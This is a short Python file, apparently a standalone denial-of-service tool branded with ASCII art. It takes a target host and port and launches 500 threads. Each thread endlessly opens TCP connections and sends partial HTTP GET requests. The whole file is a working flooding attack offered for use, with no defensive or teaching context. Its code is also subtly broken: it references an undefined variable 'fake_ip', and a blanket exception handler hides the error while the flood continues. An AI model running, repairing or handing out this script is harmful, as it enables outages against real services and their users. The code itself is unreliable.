import socket
import threading
import argparse

# ASCII art
ascii_art = """
  _________  _______   _____ ______   ________  _______   ________  _________   
 |\___   ___\\  ___ \ |\   _ \  _   \|\   __  \|\  ___ \ |\   ____\|\___   ___\ 
 \|___ \  \_\ \   __/|\ \  \\\__\ \  \ \  \|\  \ \   __/|\ \  \___|\|___ \  \_| 
      \ \  \ \ \  \_|/_\ \  \\|__| \  \ \   ____\ \  \_|/_\ \_____  \   \ \  \  
       \ \  \ \ \  \_|\ \ \  \    \ \  \ \  \___|\ \  \_|\ \|____|\  \   \ \  \ 
        \ \__\ \ \_______\ \__\    \ \__\ \__\    \ \_______\____\_\  \   \ \__\
         \|__|  \|_______|\|__|     \|__|\|__|     \|_______|\_________\   \|__|
                                                            \|_________|         
"""

def ddos(target, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto((f"GET /{target} HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto((f"Host: {fake_ip}\r\n\r\n").encode('ascii'), (target, port))
            s.close()
            print("Attack sent to", target)
        except Exception as e:
            print("Error:", e)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple DDoS script with ASCII art")
    parser.add_argument("target", type=str, help="Target IP address or domain name")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")

    args = parser.parse_args()

    target = args.target
    port = args.port

    print(ascii_art)

    # Start DDoS attack
    for i in range(500):  # Number of threads to create for the attack
        ddos_thread = threading.Thread(target=ddos, args=(target, port))
        ddos_thread.start()
